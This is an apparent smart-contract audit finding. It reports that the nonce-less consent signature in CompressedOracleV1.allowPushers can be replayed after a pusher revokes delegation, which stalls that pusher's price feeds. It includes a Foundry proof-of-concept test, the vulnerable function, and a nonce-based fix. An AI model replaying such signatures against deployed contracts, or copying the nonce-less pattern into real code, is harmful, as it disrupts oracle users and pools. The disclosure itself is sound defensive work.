### Title
Nonce-less `allowPushers` consent signature allows creator to replay revoked delegation within the deadline window, permanently locking a pusher out of their own namespace — (`File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1.allowPushers` verifies a pusher's EIP-191 consent signature but includes no nonce in the signed digest. A creator who holds a valid (non-expired) consent signature can call `allowPushers` an unlimited number of times with the same bytes, re-establishing `namespaceRemapping[pusher] = creator` immediately after every `revokePusher()` the pusher submits. The pusher cannot write to their own namespace until the original deadline expires, causing any pool that reads from the pusher's own-namespace feeds to receive stale prices.

---

### Finding Description

The signed consent digest in `allowPushers` is:

```solidity
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
``` [1](#0-0) 

The tuple `(chainid, oracle, deadline, pusher, creator)` is fully static for a given consent. There is no nonce, no per-pusher counter, and no "used-signature" bitmap. The contract's own NatSpec acknowledges the partial protection the deadline provides ("an undated signature could re-establish a delegation AFTER the pusher revoked it"), but the deadline only prevents post-expiry replay; it does nothing to prevent within-window replay. [2](#0-1) 

`revokePusher()` clears `namespaceRemapping[msg.sender]` to `address(0)`: [3](#0-2) 

But `allowPushers` unconditionally overwrites the mapping with `msg.sender` (the creator) on every successful call: [4](#0-3) 

Because the signature is reusable, the creator can call `allowPushers` again with the identical `(deadline, [pusher], [sig])` arguments immediately after the pusher's revocation, restoring the delegation. This cycle can be repeated for the entire lifetime of the deadline.

While the delegation is active, the `fallback` push path resolves the pusher's namespace to the creator's:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [5](#0-4) 

Every push the pusher sends lands in the creator's namespace, not the pusher's own. The pusher's own-namespace slots remain at their last written value (or all-zero if never written), and their timestamp never advances.

---

### Impact Explanation

Any pool or price provider configured to read from `feedIdOf(pusher, slotIndex, positionIndex)` will receive a stale or zero-timestamp price. `ProtectedPriceProvider._isStale` treats `refTime == 0` and any timestamp older than `maxTimeDelta` as stale and reverts `FeedStalled`: [6](#0-5) 

A stalled feed causes `getBidAndAskPrice()` to revert: [7](#0-6) 

This makes every swap through any pool that depends on the pusher's own-namespace feed permanently unusable for the duration of the deadline window — matching the allowed impact gate "Broken core pool functionality causing loss of funds or unusable withdraw/swap/liquidity flows" and "Bad-price execution: stale bid/ask quote reaches a pool swap."

---

### Likelihood Explanation

The creator already holds the pusher's signed consent (they used it to call `allowPushers` the first time). No additional privileges, off-chain infrastructure, or special timing is required. The creator simply monitors the mempool for `revokePusher()` and front-runs or immediately follows it with another `allowPushers` call using the same signature. On low-fee L2 networks (Arbitrum, Base) this is cheap and sustainable for the entire deadline window, which can be set to months or years by the pusher at signing time.

---

### Recommendation

Add a per-pusher nonce to the signed digest and increment it on every successful `allowPushers` call. Store the current nonce in a `mapping(address => uint256) public pusherNonce` and include it in the hash:

```solidity
mapping(address => uint256) public pusherNonce;

// in allowPushers, per pusher:
uint256 nonce = pusherNonce[pusher]++;
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, nonce, pusher, msg.sender))
);
```

This ensures each consent signature is single-use: once the delegation is established (nonce incremented), the same signature cannot re-establish it after revocation.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";

contract ReplayDelegationPoC is Test {
    CompressedOracleV1 oracle;

    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testRevokeIsNullifiedByReplay() public {
        uint256 deadline = block.timestamp + 365 days;

        // 1. Pusher signs consent for creator
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // 3. Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // 4. Creator replays the SAME signature — delegation re-established
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs); // same sig, no revert
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegation restored by replay");

        // 5. Pusher's pushes still land in creator's namespace; pusher's own namespace stays stale
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint48 raw = uint48((uint48(1_000_000) << 16) | (uint48(3) << 8) | uint48(3));
        uint256 word = (uint256(tsMs) << 8) | uint256(0); // slotId=0
        word |= uint256(raw) << 208;

        vm.prank(pusher);
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        assertTrue(ok);

        // Push landed in creator's namespace, NOT pusher's own
        assertGt(oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price, 0, "creator ns updated");
        assertEq(oracle.getOracleData(oracle.feedIdOf(pusher, 0, 0)).price, 0,  "pusher own ns stays stale");
    }
}
```

    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
